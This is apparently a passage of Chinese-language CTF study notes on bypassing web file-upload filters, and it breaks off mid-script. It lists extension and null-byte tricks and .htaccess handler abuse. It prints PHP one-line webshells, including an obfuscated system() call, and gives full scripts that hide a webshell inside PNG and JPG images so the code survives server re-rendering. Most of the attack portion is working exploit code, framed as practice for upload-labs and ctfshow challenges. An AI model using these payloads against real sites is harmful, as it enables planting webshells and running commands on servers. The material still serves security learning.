<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">白名单:   png jpg gif</span><br><span class="line">黑名单:  (不能上传这些后缀名) php  jsp asp </span><br></pre></td></tr></table></figure>
</li>
<li><p>文件内容头校验（<code>GIF89a</code>）文件幻数检测</p>
</li>
<li><p>文件内容检测 (检测内容是否合法或含有恶意代码   二次渲染配合文件包含<a href="https://xz.aliyun.com/t/2657#toc-3">二次渲染</a></p>
</li>
</ul>
<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">找漏网之鱼：php3,php4,php7等 (PHP版本&lt;5.3可使用%00截断) </span><br><span class="line">AddType application&#x2F;x-httpd-php .php .php3 .php5 .php7</span><br><span class="line"></span><br><span class="line">大小写绕过：AsP、pHP</span><br><span class="line">文件后缀双写绕过   php &quot;&quot;</span><br><span class="line"></span><br><span class="line">上传不符合windows文件命名规则的文件名 test.php:1.jpg test.php::$DATA 会被windows系统自动去掉不符合规则符号后面的内容</span><br><span class="line">配合解析漏洞绕过</span><br><span class="line"></span><br><span class="line">%00截断 (PHP&lt;5.3.4时 shell.php%00.jpg 可截断%00后的内容) 配合解析漏洞绕过</span><br><span class="line">c语言里面的%00</span><br><span class="line"></span><br><span class="line">.htaccess绕过   (apache)</span><br><span class="line">.user.ini绕过   (nginx)</span><br></pre></td></tr></table></figure>
<h5 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title=".htaccess绕过"></a>.htaccess绕过</h5><p><code>如upload-labs第四关</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。</span><br><span class="line">.htaccess主要的作用有：</span><br><span class="line">URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止&#x2F;允许特定IP&#x2F;IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。</span><br></pre></td></tr></table></figure>
<p><strong>php网站在进行解析php的时候会首先解析当前目录下的配置文件</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">1.jpg</span>&quot;&gt;</span>  //匹配文件</span><br><span class="line">        SetHandler application/x-httpd-php  </span><br><span class="line">    //SetHandler方法将1.jpg当成php代码执行</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line">// 作用范围 当前目录</span><br><span class="line"></span><br><span class="line">php_value auto_prepend_file &quot;.htaccess&quot;</span><br><span class="line">#&lt;?php eval($_POST[cmd]);?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="内容检测"><a href="#内容检测" class="headerlink" title="内容检测"></a>内容检测</h3><p><code>一般来说是对上传的文件的内容进行一个检测，比如&lt;? ?&gt; php 等等</code></p>
<p>绕过思路是去构造免杀的webshell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=php&gt;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">123</span>]);&lt;/script&gt;<span class="comment">#PHP5 支持</span></span><br></pre></td></tr></table></figure>
<p><strong>实验</strong></p>
<p>ctfshow web168</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;syste&#x27;</span>.<span class="string">&#x27;m&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;cat ../f*&#x27;</span>);</span><br><span class="line">array_map(<span class="variable">$func</span>, <span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure>
<h3 id="FUZZ字典"><a href="#FUZZ字典" class="headerlink" title="FUZZ字典"></a>FUZZ字典</h3><p><strong>fuzz模糊测试</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php3 php4 php5 php6</span><br></pre></td></tr></table></figure>
<p><a href="https://www.freebuf.com/articles/web/188464.html">构造优质上传漏洞Fuzz字典</a></p>
<h3 id="二次渲染的三种姿势"><a href="#二次渲染的三种姿势" class="headerlink" title="二次渲染的三种姿势"></a>二次渲染的三种姿势</h3><p>参考链接：</p>
<p><a href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">Upload-Labs第Pass-16通关（二次渲染绕过） 详解</a></p>
<h4 id="GIF绕过姿势"><a href="#GIF绕过姿势" class="headerlink" title="GIF绕过姿势"></a>GIF绕过姿势</h4><p>先用copy命令安排一个图片马：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.gif /b + <span class="built_in">cmd</span>.php /a <span class="built_in">cmd</span>.gif</span><br></pre></td></tr></table></figure>
<p>上传带马的图片，发现没有成功，于是将它下载下来。发现文件名已经变了，且写在gif末端的PHP代码已经被扬了。</p>
<p>对于GIF的二次渲染而言，我们只需要比对渲染前后没有变化的位置即可。在没有变化的部分里面插入一句话木马，即可成功绕过。</p>
<h4 id="PNG绕过姿势"><a href="#PNG绕过姿势" class="headerlink" title="PNG绕过姿势"></a>PNG绕过姿势</h4><p>PNG图片的原理在参考博客中有极为详细的解释与描述，这里就不再赘述。只复现二次渲染的方法。</p>
<p>博客里提到的第一种方法，目前未能复现成功，这种方式只针对索引彩色图像的png图片才有效，在选取png图片时可根据IHDR数据块的color type辨别.03为索引彩色图像。</p>
<p>因此复现第二种方法，通过国外大佬的脚本一键生成。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng(<span class="variable">$img</span>,<span class="string">&#x27;./shell.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到的一句话木马为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span><span class="variable">$_GET</span>[<span class="number">0</span>](<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用方式是get传参数0，post传参数1</p>
<p>注意：eval有时候运行不了，需要使用assert</p>
<p><code>?0=assert</code> , <code>1=phpinfo()</code></p>
<h4 id="JPG绕过姿势"><a href="#JPG绕过姿势" class="headerlink" title="JPG绕过姿势"></a>JPG绕过姿势</h4><p>未能复现成功，只写做法。</p>
<p>国外大佬的处理脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> DataInputStream(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = file_get_contents(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="variable">$dis</span>-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;readByte();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;skip(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;seek();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>) || !is_file(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>羽师傅的处理脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?php system(&#x27;tac f*&#x27;);?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> DataInputStream(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = file_get_contents(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="variable">$dis</span>-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;readByte();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;skip(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;seek();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span 